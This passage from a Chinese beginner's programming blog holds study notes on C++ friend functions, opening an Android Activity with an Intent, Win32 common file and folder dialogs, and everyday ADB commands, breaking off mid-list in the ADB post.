        <h1 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h1><p>这种函数当时学的时候忘了，在这里重新回忆一下，这种函数的作用和他的名字一样，就是方便我们的使用，就是说你没有必要将这个函数放在你的类中，只需要在生命的时候给他前面加上一个friend，然后就在外部声明就好了，还有就是友元类，这个和友元函数类似。<br>简单的看下友元函数的写法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="keyword">int</span> a;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">int</span> <span class="title">Geta</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> a;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">FGA</span><span class="params">(Test&amp; i)</span></span>;<span class="comment">//友元函数的定义</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FGA</span><span class="params">(Test&amp; i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	i.a = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test *o = <span class="keyword">new</span> Test();</span><br><span class="line">	FGA(*o);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;o-&gt;Geta()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/21/C-friend-fun/" data-id="ck5xij34j0003e0wjb0nw43on" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Win32%E7%BC%96%E7%A8%8B/" rel="tag">Win32编程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Intent-Open-Activity" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/20/Intent-Open-Activity/" class="article-date">
  <time datetime="2020-01-20T10:47:35.000Z" itemprop="datePublished">2020-01-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/20/Intent-Open-Activity/">Intent Open Activity</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="通过Intent打开Activity"><a href="#通过Intent打开Activity" class="headerlink" title="通过Intent打开Activity"></a>通过Intent打开Activity</h1><h2 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h2><p>官方解释：<br>[^Intent]:Intent（意图）主要是解决Android应用的各项组件之间的通讯。<br>Intent负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android则根据此Intent的描述，负责找到对应的组件，将 Intent传递给被调用的组件，并完成组件的调用。<br>因此，Intent在这里起着一个媒体中介的作用，专门提供组件互相调用的相关信息，实现调用者与被调用者之间的解耦。</p>
<p>简单的说，这个东西通俗的将其实就是一个媒介，通过在他里面放东西，然后做一些事情（目前我的层面是这么理解）。</p>
<h2 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h2><p>这个东西就类似是一个界面，用于和用户进行界面交互。</p>
<h2 id="通过Intent打开一个Activity"><a href="#通过Intent打开一个Activity" class="headerlink" title="通过Intent打开一个Activity"></a>通过Intent打开一个Activity</h2><p>我们经常会有这样子的需求，就是说我们需要在这个页面通过一个按钮打开另外的一个页面，那么我们就可以这个样子进行操作。<br>首先我们用eclipse创建一个安卓项目，自带一个Activity，然后我们编辑：res/layout下生成的xml文件，我们添加一个button，布局什么的这些测试的过程中不是很重要。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/btn_OpenActivity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_below</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"@string/Open"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- PS：</span></span><br><span class="line"><span class="comment">第一句代码，是用来指定我们的button的ID为：btn_OpenActivity</span></span><br><span class="line"><span class="comment">第二三句代码：用来指定我们的button宽与高（wrap_content表示与文字同高宽）</span></span><br><span class="line"><span class="comment">四五句：layout_alignLeft：这个表示与给定ID同左边，五类似四</span></span><br><span class="line"><span class="comment">@string/Open：这个主要是在我们的res/values/strings.xml这个文件中有我们给定的常量值。</span></span><br><span class="line"><span class="comment"> --&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们编辑完Activity.xml之后我们再添加一个布局，这个就是我们通过Intent打开的一个界面，编辑的话呢，也不是很重要，参考上面就好。</p>
<p><strong>然后我们在 AndroidManifest.xml 文件中的加上Activity一个节点：<code>&lt;activity android:name=&quot;.activity&quot;&gt;&lt;/activity&gt;</code>，这个就有点类似于声明一个Activity。</strong></p>
<p>编辑完之后我们新建一个类，这个类是我们的第二个界面，这个类要继承于Activity这个类，表明他是一个窗口，我们重载<code>onCreate</code>这个函数用来添加我们的上下文对象（注意这里与Win32有点类似，Win32称之为DC，但是我Java称之为Layout），具体代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">activity</span> <span class="keyword">extends</span> <span class="title">Activity</span></span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_01);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">比较好理解，其实setContentView这个函数就是一个就是关联一个布局，这个布局的ID在我们gen/R.java这个文件中进行定义，final static定义的一个常量。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>我们编辑完我们的Activity打开页面之后，我们来编辑我们的初始界面，这个界面我们使用下面的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Button btn_test;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line">		btn_test = (Button) findViewById(R.id.btn_OpenActivity);</span><br><span class="line">		btn_test.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">				intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">				startActivity(intent);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></span><br><span class="line">		getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Handle action bar item clicks here. The action bar will</span></span><br><span class="line">		<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></span><br><span class="line">		<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></span><br><span class="line">		<span class="keyword">int</span> id = item.getItemId();</span><br><span class="line">		<span class="keyword">if</span> (id == R.id.action_settings) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大部分不是太重要，关键的就是我们的看：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Button btn_test;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line">		btn_test = (Button) findViewById(R.id.btn_OpenActivity);</span><br><span class="line">		btn_test.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">				intent.setClass(MainActivity.<span class="keyword">this</span>, activity<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//packageContext上下文</span></span><br><span class="line">				startActivity(intent);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这一段代码使我们的关键，首先我定义了一个private权限的button，然后我们用<code>findviewById</code>这个函数进行关联，还是用到了R文件下的全局ID，然后进行了强制转换，关联之后我们设置一个监听器，new一个就好，不要用this那种方法，反正我不是很喜欢，那种写法让我想起了Win32繁杂的switch case语句，很烦的，题外话。然后我们在那个消息器中new一个Intent，然后将我们的Intent设置一下Class，setClass这个方法其实我也不是很明白，但是看样子就是讲我们的一个上下文对象关联到一个类上面，网上看了一下介绍：</p>
<ul>
<li>intent.setClass(目前的acitivy.this, 目标activity.class);<br>应该就是这个样子的一个意思，然后我们startActivity就可以了。最后的效果：<br><img src="img1.gif" alt="实现效果"><br>记录一下东西，Ctrl+shift+/这个就可以进行快速注释，Alt+/就可以快速联想。<br>扩展：match_parent:是layout_width和layout_height的属性值之一，表示和父组件一样的长度。<br>这些Activity是以栈的形式在内存中保存的，这个动脑子想一下也就知道了。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/20/Intent-Open-Activity/" data-id="ck5xij353000me0wjbl1y3obm" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android%E5%AD%A6%E4%B9%A0/" rel="tag">Android学习</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-通用对话框" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/19/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%AF%9D%E6%A1%86/" class="article-date">
  <time datetime="2020-01-19T09:44:06.000Z" itemprop="datePublished">2020-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/19/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%AF%9D%E6%A1%86/">通用对话框</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="通用对话框"><a href="#通用对话框" class="headerlink" title="通用对话框"></a>通用对话框</h1><p>通用对话框其实还是比较常用的，这里主要分为获取文件目录和获取文件夹目录两种对话框形式，并且获取文件目录的对话框还分为打开文件和写入文件两种对话框形式。</p>
<h2 id="获取文件目录"><a href="#获取文件目录" class="headerlink" title="获取文件目录"></a>获取文件目录</h2><p>这个相对而言是比较简单的，主要的牵扯到GetOpenFileName()和GetSaveFileName()这两个函数，这两个函数需要一个同样的参数，这个参数也就是一个OPENFILENAME类型的指针，这个类型在MSDN中的定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOFN</span> &#123;</span> <span class="comment">// ofn </span></span><br><span class="line">    DWORD         lStructSize; </span><br><span class="line">    HWND          hwndOwner; </span><br><span class="line">    HINSTANCE     hInstance; </span><br><span class="line">    LPCTSTR       lpstrFilter; </span><br><span class="line">    LPTSTR        lpstrCustomFilter; </span><br><span class="line">    DWORD         nMaxCustFilter; </span><br><span class="line">    DWORD         nFilterIndex; </span><br><span class="line">    LPTSTR        lpstrFile; </span><br><span class="line">    DWORD         nMaxFile; </span><br><span class="line">    LPTSTR        lpstrFileTitle; </span><br><span class="line">    DWORD         nMaxFileTitle; </span><br><span class="line">    LPCTSTR       lpstrInitialDir; </span><br><span class="line">    LPCTSTR       lpstrTitle; </span><br><span class="line">    DWORD         Flags; </span><br><span class="line">    WORD          nFileOffset; </span><br><span class="line">    WORD          nFileExtension; </span><br><span class="line">    LPCTSTR       lpstrDefExt; </span><br><span class="line">    DWORD         lCustData; </span><br><span class="line">    LPOFNHOOKPROC lpfnHook; </span><br><span class="line">    LPCTSTR       lpTemplateName; </span><br><span class="line">&#125; OPENFILENAME;</span><br></pre></td></tr></table></figure>
<p>这里面比较重要的也就是</p>
<ul>
<li>lpstrFile</li>
<li>nMaxFile</li>
<li>lpstrFilter</li>
<li>nFilterIndex<br>这四个字段比较重要，第一个保存我们文件目录的一个char类型指针变量，NMaxFile应该是一个最大长度的限制，这里我们用MAX_PATH这个就可以了。lpstrFilter这个是过滤器的一个字符串，\0代表一个结束，支持正则，\0\0代表过滤器终止。nFilterIndex过滤器首选第几个。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例代码：</span></span><br><span class="line">	<span class="keyword">char</span> szFileName[MAX_PATH] = <span class="string">""</span>;</span><br><span class="line">	OPENFILENAME file = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	file.lStructSize = <span class="keyword">sizeof</span>(file);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//设置对话框的属性</span></span><br><span class="line">	file.lpstrFile = szFileName;</span><br><span class="line">	file.nMaxFile = MAX_PATH;</span><br><span class="line">	file.lpstrFilter = <span class="string">"Text Files(*.txt)\0*.txt\0All Files\0*.*\0\0"</span>;<span class="comment">//最后的兩個\0是代表結束</span></span><br><span class="line">	file.nFilterIndex = <span class="number">1</span>; <span class="comment">//這個應該是代表哪個過濾器顯示在第一個得把。</span></span><br><span class="line">	<span class="keyword">if</span> (GetOpenFileName(&amp;file))<span class="comment">//GetSaveFileName這個是用來保存文件的，參數一樣，返回值代表了我們點擊的是不是確定</span></span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>,szFileName,<span class="string">"打開的文件"</span>,MB_OK);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
不要忘记导入Windows.h这个头文件，【GetSaveFileName类似】。<h2 id="获取文件夹目录"><a href="#获取文件夹目录" class="headerlink" title="获取文件夹目录"></a>获取文件夹目录</h2>这个就稍微有一点点麻烦，所以我们写一个类，支持我们以后进行编写：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __DIRDIALOG_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __DIRDIALOG_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ShlObj.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDirDialog</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CDirDialog();</span><br><span class="line">	<span class="function">BOOL <span class="title">DoBrowse</span><span class="params">(HWND hWndParent,LPCTSTR pszTitle = <span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	<span class="function">LPCTSTR <span class="title">GetDirPath</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> m_szPath;&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	BROWSEINFOA m_bi;</span><br><span class="line">	<span class="comment">//用來接收用戶選擇目錄的緩衝區</span></span><br><span class="line">	<span class="keyword">char</span> m_szPath[MAX_PATH];</span><br><span class="line">	<span class="keyword">char</span> m_szDisplay[MAX_PATH];</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&#125;;</span><br><span class="line">CDirDialog::CDirDialog()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;m_bi,<span class="number">0</span>,<span class="keyword">sizeof</span>(m_bi));<span class="comment">//先清空一下這個變量</span></span><br><span class="line">	m_bi.hwndOwner = <span class="literal">NULL</span>;<span class="comment">//對話框父窗口</span></span><br><span class="line">	m_bi.pidlRoot = <span class="literal">NULL</span>;<span class="comment">//用來接收起始目錄的那個結構</span></span><br><span class="line">	m_bi.pszDisplayName = m_szDisplay;<span class="comment">//接受緩衝區的</span></span><br><span class="line">	m_bi.lpszTitle = <span class="literal">NULL</span>;<span class="comment">//對話框中定義的文字</span></span><br><span class="line">	m_bi.ulFlags = BIF_RETURNONLYFSDIRS;<span class="comment">//我們只接受文件系統中的目錄</span></span><br><span class="line">	m_szPath[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CDirDialog::DoBrowse(HWND hWndParent,LPCTSTR pszTitle)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(pszTitle == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		m_bi.lpszTitle = <span class="string">"選擇目標文件夾"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_bi.lpszTitle = pszTitle;</span><br><span class="line">	&#125;</span><br><span class="line">	m_bi.hwndOwner = hWndParent;</span><br><span class="line">	LPITEMIDLIST pItem = SHBrowseForFolder(&amp;m_bi);</span><br><span class="line">	<span class="keyword">if</span> (pItem !=<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		SHGetPathFromIDList(pItem,m_szPath);</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__DIRDIALOG_H__結束</span></span></span><br></pre></td></tr></table></figure>
简单说明一下SHGetPathFromIDList这个函数，LPITEMIDLIST这个结构体比较复杂，但是我们通过这个函数我们就可以简单的获取到我们输入的内容。<br>如果我们要用的话呢我们只需要<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CDirDialog.h"</span></span></span><br><span class="line">CDirDialog dir;</span><br><span class="line"><span class="keyword">if</span>(dir.DoBrowse(<span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>,dir.GetDirPath(),<span class="string">"打開的文件"</span>,MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这样就可以打开一个文件目录了。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/19/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%AF%9D%E6%A1%86/" data-id="ck5xij3720021e0wj1t5tfxfz" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Win32%E7%BC%96%E7%A8%8B/" rel="tag">Win32编程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-adb-Common-method" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/18/adb-Common-method/" class="article-date">
  <time datetime="2020-01-18T13:29:47.000Z" itemprop="datePublished">2020-01-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/18/adb-Common-method/">adb-Common-method</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>初学Android</p>
<h1 id="ADB常用命令"><a href="#ADB常用命令" class="headerlink" title="ADB常用命令"></a>ADB常用命令</h1><ul>
<li>adb devices<br>这个用于查看当前连接的模拟器。<br><img src="img1.jpg" alt="查看当前连接对象"></li>
<li>adb start-server <strong>开启调试器</strong></li>
<li>adb kill-server  <strong>终止调试器</strong></li>
<li>adb -s 参数 install 路径 <strong>安装一个apk文件</strong> 参数适用于指定安装的路径</li>
<li>adb shell 获取Android的Shell <strong>这个命令有点类似于Linux的命令，且当前目录是我们的根目录</strong><br><img src="img2.jpg" alt="Shell权限"><blockquote>
<p>在这里我刚了解到，原来Android的内核是基于Linux的。<br>exit 退出当前的Shell</p>
</blockquote>
</li>
<li>adb push &lt;Windows的一个文件&gt;&lt;手机文件目录&gt; <strong>主要用来传给我们手机电脑上的一个文件</strong><br>但是如果你遇到：<em>Unable to chmod ***: Read-only file system</em><br>那么解决办法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">首先我们需要adb切换到root权限：adb remount</span><br><span class="line">然后我们重新挂载：mount -rw -o remount &#x2F;</span><br><span class="line"></span><br><span class="line">	注：</span><br><span class="line">  	mount 是挂载命令</span><br><span class="line">  	-rw  是说指定的挂载文件是可读&#x2F;写的</span><br><span class="line"> 	-o remount &#x2F; 是说重新挂载根</span><br><span class="line">然后我们chmod 777 文件夹</span><br><span class="line">777就是可读可写，具体忘记了，Linux的一些操作过短时间需要复习了看来。</span><br></pre></td></tr></table></figure>
<img src="img3.jpg" alt="重新挂载"><br><img src="img4.jpg" alt="赋予权限"></li>
